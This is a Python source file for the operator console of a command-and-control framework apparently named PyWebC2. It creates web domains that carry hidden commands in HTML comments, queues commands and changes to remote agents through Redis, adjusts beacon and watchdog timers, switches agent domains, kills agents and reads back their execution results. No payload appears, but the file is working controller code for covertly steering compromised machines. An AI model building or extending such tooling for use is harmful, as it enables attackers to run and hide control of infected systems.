import typer
import typer_shell
from domain_orchestrator import DomainOrchestrator
import redis
from typing_extensions import Annotated
from typing import Optional

# Libraries that are used to handle graceful shutdowns
import signal
import atexit
import sys

# Modules that handle the transmission of commands
import command as c
import read

# Library to tranlsate timestamps from the messages
from datetime import datetime

# TODO: Add the rich help panel for functions that have different arguements: https://typer.tiangolo.com/tutorial/options/help/#cli-options-help-panels
# TODO: Make the TUI have a side bar or otherwise, that acts as a log showing everything that is actively being executed (THis could maybe be done in go using bubble tea long term if I feel like it )
# TODO: Make it such that session durations can be set, or taking an agent out of a session mode is easier. Still need to work on making the session mode more interactive


class PyWebC2Shell:
    def __init__(self) -> None:
        # Initialize the typer shell as part of the class
        self.app = typer_shell.make_typer_shell()
        self.dorch = DomainOrchestrator()
        # Redis client to be able to subscribe to the streams that are output
        self.redis_client = redis.Redis()
        self.monitoring = False
        self.monitor_thread = None
        # Reload all of the previously stored applications
        self.dorch.startup_domains()
        # Register the shutdown handlers
        self._register_shutdown_handlers()
        # NOTE: Any new commands that are added MUST be registered here otherwise they will not run
        self.app.command()(self.create)
        self.app.command()(self.remove)
        self.app.command()(self.list)
        self.app.command()(self.pause)
        self.app.command()(self.resume)
        self.app.command()(self.read)
        self.app.command()(self.command)
        self.app.command()(self.queue)
        self.app.command()(self.modify)

    def _build_modification_commands(
        self,
        watchdog=None,
        beacon=None,
        change_mode=None,
        domain_add=None,
        domain_remove=None,
        domain_active=None,
        kill=False,
    ):
        """Convert CLI flags into properly formatted agent modification commands with validation"""
        commands = []

        if watchdog is not None:
            if watchdog <= 0:
                raise ValueError("Watchdog timer must be a positive integer")
            commands.append(f"watchdog:{watchdog}")

        if beacon is not None:
            if beacon <= 0:
                raise ValueError("Beacon interval must be a positive integer")
            commands.append(f"beacon:{beacon}")

        if change_mode is not None:
            if change_mode not in ["l", "b"]:
                raise ValueError("Mode must be 'l' for long-poll or 'b' for beacon")
            commands.append(f"change_mode:{change_mode}")

        if domain_add is not None:
            if not domain_add.strip():
                raise ValueError("Domain to add cannot be empty")
            commands.append(f"domain_add:{domain_add}")

        if domain_remove is not None:
            if not domain_remove.strip():
                raise ValueError("Domain to remove cannot be empty")
            commands.append(f"domain_remove:{domain_remove}")

        if domain_active is not None:
            if not domain_active.strip():
                raise ValueError("Active domain cannot be empty")
            commands.append(f"domain_active:{domain_active}")

        if kill:
            commands.append("kill")

        return commands

    def modify(
        self,
        domain: str,
        watchdog: Annotated[
            Optional[int],
            typer.Option(help="Set watchdog timer in seconds (must be positive)"),
        ] = None,
        beacon: Annotated[
            Optional[int],
            typer.Option(help="Set beacon interval in seconds (must be positive)"),
        ] = None,
        change_mode: Annotated[
            Optional[str],
            typer.Option(help="Change agent mode ('b' for beacon, 'l' for long-poll)"),
        ] = None,
        domain_add: Annotated[
            Optional[str], typer.Option(help="Add a new domain for the agent")
        ] = None,
        domain_remove: Annotated[
            Optional[str], typer.Option(help="Remove a domain from the agent")
        ] = None,
        domain_active: Annotated[
            Optional[str], typer.Option(help="Set the active domain for the agent")
        ] = None,
        kill: Annotated[bool, typer.Option(help="Kill the agent")] = False,
    ):
        """Inject agent modification commands into Redis stream for a specific domain"""

        if domain not in self.dorch.get_all_domains():
            print(
                "ERROR: Domain provided is not an available domain, use the list command to see all domains"
            )
            return

        if domain not in self.dorch.get_running_domains():
            print(
                "WARNING: The domain that this command is queued to is not actively running"
            )

        try:
            commands = self._build_modification_commands(
                watchdog=watchdog,
                beacon=beacon,
                change_mode=change_mode,
                domain_add=domain_add,
                domain_remove=domain_remove,
                domain_active=domain_active,
                kill=kill,
            )

            if not commands:
                print(
                    "ERROR: No modification commands provided. Use --help to see available options."
                )
                return

            if c.queue_agent_modification_commands(domain, self.redis_client, commands):
                print(
                    f"SUCCESS: Agent modification commands {commands} successfully queued for domain {domain}"
                )
            else:
                print("ERROR: Failed to queue agent modification commands")

        except ValueError as e:
            print(f"ERROR: {e}")

    def create(
        self,
        domain: str,
        port: Annotated[
            int,
            typer.Option(help="The port number you would like the domain to run from"),
        ] = 8000,
    ):
        """Create a new domain"""
        print("Usage: create <domain> [port]")

        self.dorch.create_domain(domain, ".com", port)

    def remove(self, domain: str):
        """Remove a domain"""
        self.dorch.remove_domain(domain)

    def list(
        self,
        active: Annotated[
            bool,
            typer.Option(
                help="Show all of the active domains with broadcasting streams"
            ),
        ] = False,
        paused: Annotated[
            bool,
            typer.Option(help="Show all of the paused domains"),
        ] = False,
    ):
        """Lists domains"""
        if active:
            self.dorch.print_domains(self.dorch.get_running_domains())
            return

        if paused:
            self.dorch.print_domains(self.dorch.get_paused_domains())
            return

        all_domains = [
            (domain, info) for domain, info in self.dorch.get_all_domains().items()
        ]
        self.dorch.print_domains(all_domains)

    def pause(self, domain: str):
        """Pause a domain"""
        self.dorch.pause_domain(domain)

    def resume(self, domain: str):
        """Resume a paused domain"""
        self.dorch.resume_domain(domain)

    def queue(self, domain: str, commands: str):
        """Takes a command, or a list of commands and queues them for a given domain"""

        if domain not in self.dorch.get_all_domains():
            print(
                "ERROR: Domain provided is not an available domain, use the list command to see all domains "
            )
        if domain not in self.dorch.get_running_domains():
            print(
                "WARNING: The domain that this command is queued to is not actively running"
            )
        # Get all of hte commands
        command_list = commands.split(",")
        print(command_list)
        if c.queue_commands(domain, self.redis_client, command_list):
            print(f"SUCCESS: Commands:{command_list} sucessfully queued")

    def command(self, domain: str, command: str):
        """Insert an HTML comment as a command into a domain"""

        if domain not in self.dorch.get_all_domains():
            print(
                "ERROR: Domain provided is not an available domain use the list command to see all domains"
            )
            return
        # Clear the domain of any existing commands then insert

        if c.insert_HTML_comment(domain, command):
            print(f"{command} sucessfully inserted into {domain}")
        else:
            print("Command was not able to be inserted into the domain")

    def read(
        self,
        domain: str,
        listen: Annotated[
            bool,
            typer.Option(help="Listen and diplay the results sent to the domain live"),
        ] = True,
        modification: Annotated[
            bool,
            typer.Option(help="Display the results of agent modification commands"),
        ] = False,
        history: Annotated[
            int,
            typer.Option(
                help="Shows the n most previous messages that were sent, by default this sends an entire log of all messages ever sent"
            ),
        ] = 0,
    ):
        """Display results from either execution commands or agent modification commands"""
        available_streams = [domain for domain, _ in self.dorch.get_running_domains()]

        # Append the 'all' stream, this is a stream that all domains also send their information to
        if available_streams:
            available_streams.append("all")
        else:
            print(
                "There are no current broadcast streams available to run, please create or resume one"
            )

        # Ensure that the domain provided is a domain that is an available stream
        if domain not in available_streams:
            print(
                "ERROR: Domain provided is not an available domain use the list --available command to see all available streams"
            )
            return

        # After these checks, it is assumed that the user passed in a domain to check, so:
        if modification:
            stream_name = f"{domain}:mod_results"
        else:
            stream_name = f"{domain}:results"

        if history >= 0:
            # History flag was provided - override listen behavior
            # Pass count=0 to show all messages, or count=history for specific number
            read.read_last_n_entries(self.redis_client, stream_name, history)
        elif listen:
            # Read from stream in real-time
            read.read_live_stream(self.redis_client, stream_name)

    def run(self):
        """Runs the typer app as we are calling it inside of a class"""
        self.app()

    # FIXME: There is an error where where if the user is entering a passowrd ro some other system command and they hit cntrl-C the domain gets stuck in a resume state
    ## Functions for the graceful shutting down of the application in the case of an error ##

    def _register_shutdown_handlers(self):
        """Register handlers to ensure graceful shutdown on various exit scenarios"""
        # Register atexit handler for normal Python exit
        atexit.register(self._cleanup_on_exit)

        # Register signal handlers for abrupt termination
        signal.signal(signal.SIGINT, self._signal_handler)  # Ctrl+C
        signal.signal(signal.SIGTERM, self._signal_handler)  # Termination signal

    def _cleanup_on_exit(self):
        """Cleanup function called on exit"""
        try:
            print("\nPerforming graceful shutdown...")
            self.dorch.shutdown_domains()
            print("Shutdown complete.")
        except Exception as e:
            print(f"Error during shutdown: {e}")

    def _signal_handler(self, signum, frame):
        """Handle termination signals"""
        print(f"\nReceived signal {signum}. Shutting down gracefully...")
        self._cleanup_on_exit()
        sys.exit(0)


def main():
    shell = PyWebC2Shell()
    # Run application for typer shell
    shell.run()


if __name__ == "__main__":
    print(""" 
       ▄████████  ▄█        ▄█      ███        ▄█    █▄       ▄████████    ▄████████ 
      ███    ███ ███       ███  ▀█████████▄   ███    ███     ███    ███   ███    ███ 
      ███    █▀  ███       ███▌    ▀███▀▀██   ███    ███     ███    █▀    ███    ███ 
      ███        ███       ███▌     ███   ▀  ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
    ▀███████████ ███       ███▌     ███     ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
             ███ ███       ███      ███       ███    ███     ███    █▄  ▀███████████ 
       ▄█    ███ ███▌    ▄ ███      ███       ███    ███     ███    ███   ███    ███ 
     ▄████████▀  █████▄▄██ █▀      ▄████▀     ███    █▀      ██████████   ███    ███ 
                 ▀                                                        ███    ███ 
        """)
    main()
